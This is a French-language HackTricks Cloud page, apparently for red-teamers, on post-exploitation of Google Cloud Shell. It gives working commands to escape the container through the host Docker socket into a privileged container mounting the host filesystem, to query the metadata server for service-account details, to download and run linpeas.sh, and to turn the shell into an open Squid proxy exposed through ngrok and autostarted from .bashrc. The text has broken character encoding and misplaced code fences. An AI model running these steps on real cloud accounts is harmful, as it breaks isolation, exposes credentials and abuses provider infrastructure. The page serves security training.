# GCP - Post-exploitation de Cloud Shell

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)
* &#x20;github.

</details>

## Cloud Shell

Pour plus d'informations sur Cloud Shell, consultez :

{% content-ref url="../gcp-services/gcp-cloud-shell-enum.md" %}
[gcp-cloud-shell-enum.md](../gcp-services/gcp-cloud-shell-enum.md)
{% endcontent-ref %}

### √âvasion de Conteneur

Notez que le Cloud Shell de Google fonctionne √† l'int√©rieur d'un conteneur, vous pouvez **facilement vous √©chapper vers l'h√¥te** en faisant :

{% code overflow="wrap" %}
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
```markdown
Ceci n'est pas consid√©r√© comme une vuln√©rabilit√© par Google, mais cela vous donne une vision plus large de ce qui se passe dans cet environnement.

De plus, notez que depuis l'h√¥te, vous pouvez trouver un jeton de compte de service :

{% code overflow="wrap" %}
```
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
{% endcode %}

Avec les scopes suivants :

{% code overflow="wrap" %}
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"

https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
```markdown
√ânum√©rer les m√©tadonn√©es avec LinPEAS :
```
```bash
cd /tmp
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh -o cloud
```
```markdown
{% endcode %}

Apr√®s avoir utilis√© [https://github.com/carlospolop/bf\_my\_gcp\_permissions](https://github.com/carlospolop/bf\_my\_gcp\_permissions) avec le token du Service Account, **aucune permission n'a √©t√© d√©couverte**...

### Utilisez-le comme Proxy

Si vous souhaitez utiliser votre instance google cloud shell comme proxy, vous devez ex√©cuter les commandes suivantes (ou les ins√©rer dans le fichier .bashrc) :
```
```bash
sudo apt install -y squid
```
Juste pour vous informer, Squid est un serveur proxy http. Cr√©ez un fichier **squid.conf** avec les param√®tres suivants :
```bash
http_port 3128
cache_dir /var/cache/squid 100 16 256
acl all src 0.0.0.0/0
http_access allow all
```
copiez le fichier **squid.conf** dans **/etc/squid**
```bash
sudo cp squid.conf /etc/squid
```
```bash
sudo service squid start
```
```bash
sudo service squid start
```
Utilisez ngrok pour rendre le proxy accessible de l'ext√©rieur :
```bash
./ngrok tcp 3128
```
```markdown
Apr√®s avoir ex√©cut√©, copiez l'URL tcp://. Si vous souhaitez ex√©cuter le proxy depuis un navigateur, il est conseill√© de supprimer la partie tcp:// et le port, et de saisir le port dans le champ de port des param√®tres de proxy de votre navigateur (squid est un serveur proxy http).

Pour une meilleure utilisation au d√©marrage, le fichier .bashrc devrait contenir les lignes suivantes :
```
```bash
sudo apt install -y squid
sudo cp squid.conf /etc/squid/
sudo service squid start
cd ngrok;./ngrok tcp 3128
```
Les instructions ont √©t√© copi√©es depuis [https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key](https://github.com/FrancescoDiSalesGithub/Google-cloud-shell-hacking?tab=readme-ov-file#ssh-on-the-google-cloud-shell-using-the-private-key). Consultez cette page pour d'autres id√©es folles pour ex√©cuter tout type de logiciel (bases de donn√©es et m√™me windows) dans Cloud Shell.

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
